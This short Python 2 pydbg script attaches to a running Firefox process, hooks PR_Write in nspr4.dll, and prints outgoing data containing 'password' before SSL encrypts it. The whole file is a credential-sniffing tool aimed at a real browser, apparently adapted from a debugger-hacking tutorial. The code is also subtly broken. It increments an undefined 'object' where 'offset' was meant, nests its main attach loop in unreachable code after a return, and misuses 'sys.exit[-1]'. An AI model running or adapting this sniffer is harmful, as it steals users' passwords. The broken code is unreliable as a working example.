# _*_ coding:utf-8 _*_

from pydbg import *
from pydbg.defines import *

import struct
import utils
import sys
from test import pid

db      = pydbg()
found_firefox = False

#全局字符串，钩子函数匹配条件搜索数据
pattern = "password"

#钩子的入口点回调函数
def ssl_sniff(dbg,args):
    
    buffer = ""
    offset = 0
    
    while 1:
        byte = dbg.read_process_memory(args[1] + offset, 1)
        
        if byte != "\x00":
            buffer += byte
            object += 1
            continue
        else:
            break
    if pattern in buffer:
        print"Pre-Encrypted: %s" % buffer
    
    return DBG_CONTINUE

    for (pid,name) in dbg.enumerate_processes():
    
        if name.lower() == "firefox.exe":
        
            found_firefox = True
            hooks       = utils.hook_container()
        
            dbg.attach(pid)
            print "Attach to firefox with PID:%d" % pid
        
            hocks_address = dbg.func_resolve_debuggee("nspr4.dll","PR_Write")
            
            if hocks_address:
                
                hooks.add(dbg, hocks_address ,2 ,ssl_sniff , None)
                print "nspr4.PR_Write hooked at: 0x%08x" % hocks_address
                break
            else:
                print "Error: Couldn't resolve hool address."
                sys.exit[-1]
        
        if found_firefox:
            print"Hocks set,continuing process."
            dbg.run()
        else:
            print "Error: Couldn't find the firefox.exe process. Please fire up firefox first."
            sys.exit(-1)
                
        


'''
Created on Mar 9, 2016

@author: Micih
'''
